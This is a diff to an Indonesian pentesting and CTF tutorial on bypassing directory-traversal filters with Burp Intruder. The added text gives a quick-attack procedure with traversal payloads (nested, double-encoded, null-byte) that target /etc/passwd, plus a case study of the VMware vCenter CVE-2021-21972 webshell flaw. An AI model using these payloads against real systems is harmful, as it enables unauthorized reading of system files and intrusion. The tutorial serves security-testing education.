@@ -1,5 +1,21 @@
 # Directory Traversal: Menembus Extreme Filtering Menggunakan Burp Intruder & Automated Fuzzing
 
+> [!TIP]
+> ### ⚡ Cara Cepat / Quick Solution (Langsung Praktik)
+> 1. Kirim request gambar ke **Burp Intruder** (`Ctrl+I`).
+> 2. Set posisi payload Sniper: `GET /image?filename=§50.jpg§ HTTP/1.1`.
+> 3. Di tab **Payloads**, masukkan mutasi traversal (nested, encoding, null byte):
+>    ```text
+>    ../../../etc/passwd
+>    ....//....//....//etc/passwd
+>    ..%252f..%252f..%252fetc/passwd
+>    /var/www/images/../../../etc/passwd%00.png
+>    ```
+> 4. **Wajib:** Hilangkan centang pada opsi **"URL-encode these characters"**.
+> 5. Klik **Start attack**, urutkan respons berdasarkan **Length** $\rightarrow$ temukan payload yang mengembalikan `/etc/passwd`.
+
+---
+
 Dalam skenario pengujian penetrasi (_penetration testing_) maupun kompetisi CTF tingkat lanjut, kita sering berhadapan dengan **Extreme Filtering**—kondisi di mana sistem target menerapkan pertahanan berlapis sekaligus:
 1. **Web Application Firewall (WAF)** yang memblokir sekuens `../` dan `%2e%2e%2f`.
 2. **Reverse Proxy / Load Balancer** yang melakukan dekode atau normalisasi parsial.
@@ -177,6 +193,14 @@ Berikut 15 payload mutasi esensial yang dapat kamu simpan sebagai wordlist cepat
 ```
 
 ---
+
+## 🌍 Studi Kasus Nyata di Industri (Real-World Case Study)
+
+### VMware vCenter Server Fuzzing & Traversal RCE (CVE-2021-21972)
+Ketika aplikasi enterprise memasang filter yang sangat ketat, teknik automated fuzzing mutasi menjadi kunci utama:
+* **Arsitektur Target:** VMware vCenter Server adalah pusat kendali virtualisasi cloud di ribuan korporasi. Endpoint upload plugin dilindungi oleh filter regex dan inspeksi WAF berlapis.
+* **Fuzzing Payload Mutasi:** Peneliti keamanan menyemprotkan wordlist mutasi traversal menggunakan alat otomatis. Ditemukan bahwa kombinasi encoding tertentu meloloskan pemeriksaan filter backend Java Spring vCenter, memungkinkan penyerang menulis file `.jsp` webshell ke sembarang direktori di server.
+* **Dampak & Nilai CVE:** Memiliki skor keparahan tertinggi **CVSS 9.8 (CRITICAL)** dan memungkinkan pengambilalihan seluruh cluster server virtual di datacenter tanpa memerlukan login atau kredensial apa pun.
 
 ## 6. Panduan Mitigasi Komprehensif (Defense-in-Depth)
 
